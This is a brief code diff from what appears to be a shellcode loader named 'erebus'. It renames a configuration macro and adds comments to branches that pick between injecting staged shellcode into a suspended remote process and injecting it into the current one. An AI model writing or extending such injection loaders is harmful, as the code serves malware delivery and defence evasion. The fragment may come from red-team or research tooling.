@@ -12,10 +12,12 @@ VOID entry(void)
 
 	erebus::StageResource(IDR_EREBUS_BIN1, L"EREBUS_BIN", &shellcode, &shellcode_size);
 
-#if CONFIG_INJECTION_METHOD == 1
+#if CONFIG_INJECTION_MODE == 1
+	// Remote injection: create suspended process
 	wchar_t cmdline[] = CONFIG_TARGET_PROCESS;
 	erebus::CreateProcessSuspended(cmdline, &process_handle, &thread_handle);
-#elif CONFIG_INJECTION_METHOD == 2
+#elif CONFIG_INJECTION_MODE == 2
+	// Self injection: use current process
 	process_handle = NtCurrentProcess();
 	thread_handle = NtCurrentThread();
 #endif
